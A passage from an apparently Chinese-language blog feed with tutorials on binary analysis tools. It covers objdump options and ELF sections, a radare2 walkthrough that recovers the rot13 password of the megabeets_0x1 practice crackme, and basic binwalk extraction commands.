-s提供的信息</p></li></ul><p>具体的使用方法，可以去参考这个man 出来的东西</p><hr><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>首先写一个c 代码 然后 编译 最后 objdump </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;hello,world\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517225644335.png" alt="image-20230517225644335" style="zoom:50%;" /><p>编译这个c 文件 gcc -c test.c别搞忘了</p><hr><p>下面就是文字的转载了，方便以后查询</p><p><a href="https://ivanzz1001.github.io/records/post/linux/2018/04/09/linux-objdump#1-objdump%E5%91%BD%E4%BB%A4">https://ivanzz1001.github.io/records/post/linux/2018/04/09/linux-objdump#1-objdump%E5%91%BD%E4%BB%A4</a></p><h1 id="objdump-用法详细"><a href="#objdump-用法详细" class="headerlink" title="objdump 用法详细"></a>objdump 用法详细</h1><h2 id="1-用法"><a href="#1-用法" class="headerlink" title="1 用法"></a>1 用法</h2><p>objdump命令的基本使用方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">objdump [-a|--archive-headers]</span><br><span class="line">   [-b bfdname|--target=bfdname]</span><br><span class="line">   [-C|--demangle[=style] ]</span><br><span class="line">   [-d|--disassemble]</span><br><span class="line">   [-D|--disassemble-all]</span><br><span class="line">   [-z|--disassemble-zeroes]</span><br><span class="line">   [-EB|-EL|--endian=&#123;big | little &#125;]</span><br><span class="line">   [-f|--file-headers]</span><br><span class="line">   [-F|--file-offsets]</span><br><span class="line">   [--file-start-context]</span><br><span class="line">   [-g|--debugging]</span><br><span class="line">   [-e|--debugging-tags]</span><br><span class="line">   [-h|--section-headers|--headers]</span><br><span class="line">   [-i|--info]</span><br><span class="line">   [-j section|--section=section]</span><br><span class="line">   [-l|--line-numbers]</span><br><span class="line">   [-S|--source]</span><br><span class="line">   [-m machine|--architecture=machine]</span><br><span class="line">   [-M options|--disassembler-options=options]</span><br><span class="line">   [-p|--private-headers]</span><br><span class="line">   [-P options|--private=options]</span><br><span class="line">   [-r|--reloc]</span><br><span class="line">   [-R|--dynamic-reloc]</span><br><span class="line">   [-s|--full-contents]</span><br><span class="line">   [-W[lLiaprmfFsoRt]|</span><br><span class="line">    --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames]</span><br><span class="line">            [=aranges,=macro,=frames,=frames-interp,=str,=loc]</span><br><span class="line">            [=Ranges,=pubtypes,=trace_info,=trace_abbrev]</span><br><span class="line">            [=trace_aranges,=gdb_index]</span><br><span class="line">   [-G|--stabs]</span><br><span class="line">   [-t|--syms]</span><br><span class="line">   [-T|--dynamic-syms]</span><br><span class="line">   [-x|--all-headers]</span><br><span class="line">   [-w|--wide]</span><br><span class="line">   [--start-address=address]</span><br><span class="line">   [--stop-address=address]</span><br><span class="line">   [--prefix-addresses]</span><br><span class="line">   [--[no-]show-raw-insn]</span><br><span class="line">   [--adjust-vma=offset]</span><br><span class="line">   [--special-syms]</span><br><span class="line">   [--prefix=prefix]</span><br><span class="line">   [--prefix-strip=level]</span><br><span class="line">   [--insn-width=width]</span><br><span class="line">   [-V|--version]</span><br><span class="line">   [-H|--help]</span><br><span class="line">   objfile...</span><br></pre></td></tr></table></figure><h2 id="2-含义"><a href="#2-含义" class="headerlink" title="2.含义"></a>2.含义</h2><h3 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h3><p>–archive-header</p><p>​    假如任何一个objfile是库文件，则显示相应的header信息（输出格式类似于ls -l命令）。除了可以列出<br>​    ar tv所能展示的信息，objdump -a还可以显示lib文件中每一个对象文件的格式。</p><p>–adjust-vma=offset</p><p>​    当使用objdump命令来dump信息的时候，将section addresses都加上offset。此选项主要用于section<br>​    addresses与符号表不对应的情形下，比如我们需要将相应的section放到某一个特殊的地址处时。</p><h3 id="b-bfdname"><a href="#b-bfdname" class="headerlink" title="-b bfdname"></a>-b bfdname</h3><p>–target=bfdname</p><p>​    为obj文件指定对象码(object-code)格式。本选项是非必需的，objdump命令可以自动的识别许多种格式。<br>​    例如：<br>​       objdump -b oasys -m vax -h fu.o<br>​    上面的命令用于fu.o的头部摘要信息，并明确指出了fu.o这个对象文件是vax平台上由oasys编译器编译而来。<br>​    我们可以使用-i选项来列出所支持的所有平台格式</p><h3 id="C"><a href="#C" class="headerlink" title="-C"></a>-C</h3><p>–demangle[=style]</p><p>​    将底层(low-level)的符号名解码成用户级(user-level)的名称。除了会去掉由系统添加的头部下划线之外，<br>​    还使得C++的函数名以便于理解的方式显示出来。</p><h3 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h3><p>–debugging</p><p>​    用于显示调试信息。这会使得objdump命令尝试解析STABS和IEEE格式的调试信息，然后以C语言语法格式将相应<br>​    的调试信息进行输出。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持</p><h3 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h3><p>–debugging-tags</p><p>​    类似于-g选项。但是产生的输出信息格式兼容ctags工具</p><h3 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h3><p>–disassemble</p><p>​    从objfile中对机器指令进行反汇编。本选项只对那些包含指令的section进行反汇编。</p><h3 id="D"><a href="#D" class="headerlink" title="-D"></a>-D</h3><p>–disassemble-all</p><p>​    类似于-d，但是本选项会对所有的sections进行反汇编，而不仅仅是那些包含指令的sections。</p><p>​    本选项会微妙的影响代码段的反汇编。当使用-d选项的时候，objdump会假设代码中出现的所有symbols都在对应<br>​    的boundary范围之内，并且不会跨boundary来进行反汇编； 而当使用-D选项时，则并不会有这样的假设。这就<br>​    意味着-d与-D选项在反汇编时，可能输出结果会有些不同，比如当数据存放在代码段的情况下。</p><p>–prefix-addresses</p><p>​    反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式</p><h3 id="EB"><a href="#EB" class="headerlink" title="-EB"></a>-EB</h3><h3 id="EL"><a href="#EL" class="headerlink" title="-EL"></a>-EL</h3><p>–endian={big|little}</p><p>​    指定目标文件的大小端。这仅仅会影响到反汇编。这在对某一些并未指定大小端信息的obj文件进行反汇编时很有<br>​    用，比如S-records</p><h3 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h3><p>–file-headers</p><p>​    显示每一个obj文件的整体头部摘要信息</p><h3 id="F"><a href="#F" class="headerlink" title="-F"></a>-F</h3><p>–file-offsets</p><p>​    当在对sections进行反汇编时，无论是否显示相应的symbol，都会显示其在文件内的偏移(offset)。</p><h3 id="h"><a href="#h" class="headerlink" title="-h"></a>-h</h3><p>–section-headers<br>–headers<br>    显示obj文件各个sections的头部摘要信息。</p><p>​    obj文件中segments可能会被relocate，比如在ld时通过使用-Ttext、-Tdata或者-Tbss选项。然而，有一些<br>​    对象文件格式，比如a.out，其本身并没有保存起始地址信息。在这种情况下，尽管ld可以正确的对这些sections<br>​    进行relocate，但是使用objdump -h来查看各sections的头部摘要信息时则不能正确的显示地址信息。</p><h3 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h3><p>–help<br>    objdump的帮助信息</p><h3 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h3><p>–info<br>    显示objdump所支持的所有arch以及obj格式。-m和-b选项可用到这</p><h3 id="j-name"><a href="#j-name" class="headerlink" title="-j name"></a>-j name</h3><p>–section=name<br>    仅仅显示指定名称为name的section的信息</p><h3 id="l"><a href="#l" class="headerlink" title="-l"></a>-l</h3><p>–line-numbers<br>    用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用时有效。通常要求具有调试信息，即编译时使用<br>    了-g之类的选项。</p><h3 id="m-machine"><a href="#m-machine" class="headerlink" title="-m machine"></a>-m machine</h3><p>–architecture=machine<br>    指定反汇编目标文件时使用的架构。当待反汇编的目标文件其本身并没有包含arch信息时(如S-records文件)，我们<br>    就可以使用此选项来进行指定。我们可以使用objdump -i来列出所支持的arch。</p><h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><p>–private-headers<br>    显示objfile文件格式的专属信息。具体的输出取决于object file的格式，对于某一些格式，可能并没有一些额外<br>    的信息输出</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>–reloc</p><p>​    显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来</p><h3 id="R"><a href="#R" class="headerlink" title="-R"></a>-R</h3><p>–dynamic-reloc<br>    显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>–full-contents<br>    显示指定section的所有内容。默认情况下，对于所有非空section都会显示</p><h3 id="S"><a href="#S" class="headerlink" title="-S"></a>-S</h3><p>–source<br>    将反汇编代码与源代码交叉显示。通常在调试版本能够较好的显示尤其当编译的时候指定了-g这种调试参数时，<br>    效果比较明显。隐含了-d参数。</p><p>–show-raw-insn<br>    在进行反汇编时，显示每条汇编指令对应的机器码。默认情况下会显示，除非使用了–prefix-addresses</p><p>–no-show-raw-insn<br>    反汇编时，不显示汇编指令的机器码。当使用了–prefix-addresses时，默认就不会显示机器码</p><p>–start-address=address<br>    从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出</p><p>–stop-address=address<br>    显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出</p><h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p>–syms<br>    显示文件的符号表入口。类似于nm -s提供的信息 </p><h3 id="T"><a href="#T" class="headerlink" title="-T"></a>-T</h3><p>–dynamic-syms<br>    显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D(–dynamic)<br>    显示的信息</p><h3 id="V"><a href="#V" class="headerlink" title="-V"></a>-V</h3><p>–version<br>    打印objdump的版本信息</p><h3 id="x"><a href="#x" class="headerlink" title="-x"></a>-x</h3><p>–all-headers<br>    显示所可用的header信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定</p><h3 id="z"><a href="#z" class="headerlink" title="-z"></a>-z</h3><p>–disassemble-zeroes<br>    一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编</p><p>@file</p><p>​    可以将选项集中到一个文件中，然后使用这个@file选项载入</p><hr><h2 id="常用符号表字段"><a href="#常用符号表字段" class="headerlink" title="常用符号表字段"></a>常用符号表字段</h2><ul><li><strong><code>.text</code></strong> 已编译程序的机器代码</li><li><strong><code>.rodata</code></strong> 只读数据，比如printf语句中的格式串和开关(switch)语句的跳转表</li><li><strong><code>.data</code></strong> 已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss中</li><li><strong><code>.bss</code></strong> 未初始化的全局C变量。在目标文件中，这个节(section)不占据实际的空间，它仅仅只是一个占位符。目标文件格式区分<code>初始化</code>和<code>未初始化</code>变量是为了空间效率。在目标文件中，未初始化变量不需要占用任何实际的磁盘空间。</li><li><strong><code>.symtab</code></strong> 一个符号表(symbol table)，它存放在程序中被定义和引用的函数和全局变量的信息。一些程序员错误的认为必须通过<code>-g</code>选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在<code>.symtab</code>中都有一张符号表。然而，和编译器中的符号表不同，<code>.symtab</code>符号表不包含局部变量的表目。</li><li><strong><code>.rel.text</code></strong> 当链接器把这个目标文件和其他文件结合时，<code>.text</code>节中的许多位置都需要修改。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面，调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。</li><li><strong><code>.rel.data</code></strong> 被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者外部定义函数的地址都需要被修改。</li><li><strong><code>.debug</code></strong> 一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，有些是原始的C源文件。只有以<code>-g</code>选项调用编译程序时，才会得到这张表。</li><li><strong><code>.line</code></strong> 原始C源程序中的行号和<code>.text</code>节中机器指令之间的映射。只有以<code>-g</code>选项调用编译程序时，才会得到这张表。</li><li><strong><code>.strtab</code></strong> 一个字符串表，其内容包括<code>.symtab</code>和<code>.debug</code>节中的符号表，以及节头部中的节名字。字符串表就是以NULL结尾的字符串序列。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDA 二进制分析框架-radare2（19）</title>
      <link href="/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-19-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6-radare2/"/>
      <url>/2023/05/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-19-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6-radare2/</url>
      
        <content type="html"><![CDATA[<h1 id="radare-2-介绍"><a href="#radare-2-介绍" class="headerlink" title="radare 2 介绍"></a>radare 2 介绍</h1><p>有了IDA为什么还要学这个radare2呢？我也不是很懂啦，都是使用工具。可能这个确实比较good啦。</p><p>radare 2 是一个开源的。可以在github上找到哦</p><p>至于为什么要学它。可以看看</p><p><a href="https://zhuanlan.zhihu.com/p/348481864">https://zhuanlan.zhihu.com/p/348481864</a></p><p><a href="https://www.cnblogs.com/pannengzhi/p/play-with-radare2.html">https://www.cnblogs.com/pannengzhi/p/play-with-radare2.html</a></p><p>或者自己百度啦。我这里只是随便列举出来了几个罢了。</p><hr><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>首先 radare2 是一个逆向开源的逆向工具和二进制分析框架。包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等</p><p>当然，我们的kali以及自带了radare2。</p><p>radare2工程是由于一系列的组件构成的，这些组件可以在radare2界面或者单独被使用-比如：rabin2，rahash2，radiff2，rafind2，ragg2，rarun2，rax2，radare2。</p><p>其中的主要介绍，可以看：</p><p><a href="https://xz.aliyun.com/t/7265#toc-6">https://xz.aliyun.com/t/7265#toc-6</a></p><hr><h2 id="在实战中学习"><a href="#在实战中学习" class="headerlink" title="在实战中学习"></a>在实战中学习</h2><p>用的    megabeets_0x1    这个Crackme</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517172125650.png" alt="image-20230517172125650" style="zoom:50%;" /><p>首先要给可执行的权限，然后运行一下</p><p>可以看到这个程序直接打印出来然后就退出了。</p><h3 id="1-rabin2-l-参数"><a href="#1-rabin2-l-参数" class="headerlink" title="1.    rabin2 -l  参数"></a><strong>1.    rabin2 -l  参数</strong></h3><p>打印出二进制文件的系统属性，语言，字节序，框架，使用了啥加固技术…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabin2 -I megabeets_0x1</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517172549936.png" alt="image-20230517172549936" style="zoom: 33%;" /><p>不能大意了，得用大写的 I 。</p><p>这里有一堆参数..每一个不懂的话都可以百度直接搜索。【主要是我也不是很懂】</p><p>大概看一看：这些比较简单的参数就能看出来这个是一个32位的eif文件，没有剥离符号并且是动态链接的</p><h3 id="2-radare2"><a href="#2-radare2" class="headerlink" title="2.radare2"></a><strong>2.radare2</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radare2 megabeets_0x1   </span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517173127642.png" alt="image-20230517173127642" style="zoom:50%;" /><p>这里黄色字体输出了一个地址，这个地址就是radare2自动识别出来的程序入口点。</p><h3 id="3-ie命令"><a href="#3-ie命令" class="headerlink" title="3.ie命令"></a><strong>3.ie命令</strong></h3><p>用ie命令手动答应出出入口点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x08048370]&gt; ie</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517173310544.png" alt="image-20230517173310544"></p><h3 id="4-aaa命令"><a href="#4-aaa命令" class="headerlink" title="4.aaa命令"></a><strong>4.aaa命令</strong></h3><p>分析这个程序，并且会把信息和特定的名字绑定在一起，比如区段，函数，符号，字符串，。。这些都被称为’flags’，flags被整合进【flag spaces】，一个flag 是所有类似特征的集合。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517174228579.png" alt="image-20230517174228579" style="zoom:50%;" /><h3 id="5-fs命令"><a href="#5-fs命令" class="headerlink" title="5.fs命令"></a><strong>5.fs命令</strong></h3><p>看所有的 flag</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517174240772.png" alt="image-20230517174240772" style="zoom:50%;" /><h3 id="6-fs-某个flag-f"><a href="#6-fs-某个flag-f" class="headerlink" title="6.fs [某个flag];f"></a><strong>6.fs [某个flag];f</strong></h3><p>显示出某个flag中的信息</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517183208288.png" alt="image-20230517183208288" style="zoom: 50%;" /><p>看到这个strings 有一个 success </p><p>要破解啦，肯定就是要走到success的地方。</p><p>现在来看看哪里进行了调用。</p><h3 id="7-iz命令"><a href="#7-iz命令" class="headerlink" title="7.iz命令"></a><strong>7.iz命令</strong></h3><p>输出这个数据段里面的字符串。</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517183716814.png" style="zoom:50%;" /><h3 id="8-？命令"><a href="#8-？命令" class="headerlink" title="8.？命令"></a><strong>8.？命令</strong></h3><p>这个也就是帮助文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ax?</span><br><span class="line">@@?</span><br><span class="line">str?</span><br></pre></td></tr></table></figure><p>比如：</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517184048721.png" alt="image-20230517184048721" style="zoom:33%;" /><h3 id="9-axt命令"><a href="#9-axt命令" class="headerlink" title="9.axt命令"></a><strong>9.axt命令</strong></h3><p>axt用来data/code段里面寻找某个地址相关的引用。</p><h3 id="10-axt-str"><a href="#10-axt-str" class="headerlink" title="10.axt @@ str.*"></a><strong>10.axt @@ str.*</strong></h3><ul><li><p>‘axt’ 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.</p></li><li><p>‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）</p></li><li><p>‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p></li></ul><h3 id="11-afl命令"><a href="#11-afl命令" class="headerlink" title="11.afl命令"></a><strong>11.afl命令</strong></h3><p>要列出二进制中存在的函数，请运行 afl 命令</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517185402479.png" alt="image-20230517185402479" style="zoom:50%;" /><p>这里看到的比较多啦</p><p>然后有一个sym.rot13</p><p>不知道是啥…去百度看看</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517185758817.png" alt="image-20230517185758817" style="zoom:50%;" /><p>发现是一个加密啥的</p><h3 id="12-s-函数"><a href="#12-s-函数" class="headerlink" title="12.s [函数]"></a><strong>12.s [函数]</strong></h3><p>停下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s main</span><br></pre></td></tr></table></figure><h3 id="13-pdf输出反汇编代码"><a href="#13-pdf输出反汇编代码" class="headerlink" title="13.pdf输出反汇编代码"></a><strong>13.pdf输出反汇编代码</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdf</span><br></pre></td></tr></table></figure><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517190036795.png" alt="image-20230517190036795" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517212331708.png" alt="image-20230517212331708" style="zoom:50%;" /><p>这里可以看到 call 了这个 beet 函数</p><p>然后下面有一个test 然后进行了je 判断跳转</p><p>test 就是进行 and 指令</p><ul><li>TEST 指令在两个操作数的对应位之间进行 AND 操作，并根据运算结果设置符号标志位、零标志位和奇偶标志位。</li></ul><p>je 跳转是 在ZF 标志位=1 就跳转</p><p>ZF 标志位是 进行了操作后，如果是0就是1</p><p>所以我们需要知道这个beet 是个啥</p><h3 id="14-pdf-函数名"><a href="#14-pdf-函数名" class="headerlink" title="14.pdf@函数名"></a><strong>14.pdf@函数名</strong></h3><p>可以跳转到 这个函数的地方，并且还有汇编代码</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517212806576.png" alt="image-20230517212806576" style="zoom:50%;" /><p>看这个汇编代码，push 和 mov ebp,esp 其实就是栈平衡的操作嘛</p><p>下面  push dword [src] 然后lea eax, [dest] 然后 push eax ，call sym.imp.strcpy 。</p><p>lea：和mov 一样不过，lea 是load  xxx address 【这个单词突然忘了】反正就是把地址mov 过去。而不是这个地址下的值。</p><p>按道理来说，我们应该还要去看一下sym.imp.strcpy  这里函数里面的代码，但是我们也可以猜测一下啦</p><p>这个imp 我猜就是import [进口]【也就是输入的】</p><p>strcpy 字符串拷贝咯。</p><p>所以我猜测这个就是把输入的字符串拷贝起来。拷贝到哪里去呢？【管他呢】反正不是栈就是啥空间里面。</p><p>在看下面</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517214849051.png" alt="image-20230517214849051" style="zoom:50%;" /><p>这里有一个call sym.rot13</p><p>这个rot 加密啥的【上面有百度过了】。</p><p>看上面有一个push eax 然后再call 的，我们知道一般来收 这个eax 肯定就会在这个函数里面起作用啦。</p><p>在网上看，这个eax 是： lea eax [s2] 。 这个eax 里面放的是地址，在往上看，这个地址是一个放着字符串data 数据的地址。</p><p>并且这个数据就是 Megabeets 【虽然它mov 的是一个地址，但是强大的工具，在后面以及帮我们注释出来了】</p><p>所以这个eax 中的地址就是指向这个Megabeets  的，相当于把Megabeets 传入了 rot13 这个函数，也就是把Megabeets 进行了rot13加密</p><p>下面还有一个strcmp 也就是字符串比较函数，直接就可以猜测，是将Megabeets 加密后的东西和我们输入的值进行对比，如果正确就OKl啦</p><p>所以我们只需要知道rot 13 加密出来的值是多少。</p><p>百度一下啦</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517215443203.png" alt="image-20230517215443203" style="zoom: 33%;" /><p>得到   zrtnorrgf </p><p>但是这样不优雅</p><p>我们还可以用rahash</p><h3 id="15-rahash2"><a href="#15-rahash2" class="headerlink" title="15.rahash2"></a><strong>15.rahash2</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rahash2 -E rot -S s:13 -s &#x27;Megabeets&#x27;</span><br></pre></td></tr></table></figure><p>-E 就是选中这个加密的方式</p><p>-S 【差不多就彳亍了】</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517215749934.png" alt="image-20230517215749934" style="zoom:50%;" /><p>得到的也是一样的值啦</p><p>最后我们传入这个值就对啦</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517215858918.png" alt="image-20230517215858918" style="zoom: 50%;" /><p>emmm错了。。。</p><p>我们仔细一看，这个Z 居然在上面是小写，下面是大写……..</p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517215938230.png" alt="image-20230517215938230" style="zoom:50%;" /><p>吐了。为什么呢？</p><p>我换了一个加密的地方就又对了</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517220056047.png" alt="image-20230517220056047"></p><p>说明上面那个加密的地方有点小问题…</p><h3 id="16-ood"><a href="#16-ood" class="headerlink" title="16.ood"></a><strong>16.ood</strong></h3><p>就是debug </p><p>但是这样还是不够优雅，我们可以用r2中自带的ood 进行debug </p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517220354720.png" alt="image-20230517220354720" style="zoom:50%;" /><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230517220509921.png" alt="image-20230517220509921" style="zoom:50%;" /><h3 id="17-dc查看结果"><a href="#17-dc查看结果" class="headerlink" title="17.dc查看结果"></a><strong>17.dc查看结果</strong></h3><p>结果如上。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>binwalk工具</title>
      <link href="/2023/05/16/kali%E5%B7%A5%E5%85%B7-%E5%91%BD%E4%BB%A4-%E5%A4%A7%E6%9D%82%E7%83%A9-1-Binwalk/"/>
      <url>/2023/05/16/kali%E5%B7%A5%E5%85%B7-%E5%91%BD%E4%BB%A4-%E5%A4%A7%E6%9D%82%E7%83%A9-1-Binwalk/</url>
      
        <content type="html"><![CDATA[<h1 id="对固件分析的一个工具"><a href="#对固件分析的一个工具" class="headerlink" title="对固件分析的一个工具"></a>对固件分析的一个工具</h1><p><a href="https://blog.csdn.net/weixin_44932880/article/details/112478699">https://blog.csdn.net/weixin_44932880/article/details/112478699</a></p><p><a href="https://blog.csdn.net/wxh0000mm/article/details/85683661">https://blog.csdn.net/wxh0000mm/article/details/85683661</a></p><p>1.<strong>学一个工具肯定要会看它的帮助的文档啦</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -h 或 binwalk --help</span><br></pre></td></tr></table></figure><p>【每次看这个玩意的时候，我都好像把洋文学牛皮。或者说多认识点单词】</p><p>2.<strong>固件分析扫描</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk 固件</span><br><span class="line">比如：binwalk 1.jpg</span><br></pre></td></tr></table></figure><p>3.<strong>提取文件</strong></p><p>-e 按照预定义的配置文件中的提取方法，从固件中提取探测到的文件以及系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e 1.jpg</span><br></pre></td></tr></table></figure><p>-d 用于限制递归提取的深度，默认深度为8，仅当“-M”选项存在的时候有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me -d 5 1.jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> kali工具/命令大杂烩 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ghidra工具的介绍和使用（18）</title>
      <link href="/2023/05/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-18-%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8%EF%BC%9AGhidra%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2023/05/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-18-%E9%80%86%E5%90%91%E7%A5%9E%E5%99%A8%EF%BC%9AGhidra%E7%AE%80%E4%BB%8B%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
